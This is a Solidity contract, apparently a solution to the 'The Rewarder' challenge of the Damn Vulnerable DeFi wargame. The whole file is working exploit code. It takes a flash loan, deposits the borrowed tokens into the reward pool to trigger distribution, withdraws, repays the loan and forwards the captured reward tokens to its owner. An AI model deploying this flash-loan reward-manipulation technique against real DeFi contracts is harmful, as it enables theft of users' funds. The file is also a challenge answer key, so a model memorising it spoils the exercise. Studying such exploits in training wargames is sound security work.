// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract RewarderAttack {
    TheRewarderPool private pool;
    address private owner;
    FlashLoanerPool private flashLoan;
    DamnValuableToken private token;
    RewardToken private rewardToken;

    constructor(
        address poolAddress,
        address flashLoanAddress,
        address tokenAddress,
        address rewardTokenAddress
    ) {
        pool = TheRewarderPool(poolAddress);
        owner = msg.sender;
        flashLoan = FlashLoanerPool(flashLoanAddress);
        token = DamnValuableToken(tokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoan));

        token.approve(address(pool), amount);
        pool.deposit(amount);
        pool.distributeRewards();
        pool.withdraw(amount);
        token.transfer(address(flashLoan), amount);

        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function attack() public {
        require(msg.sender == owner);
        flashLoan.flashLoan(1000000 ether);
    }
}
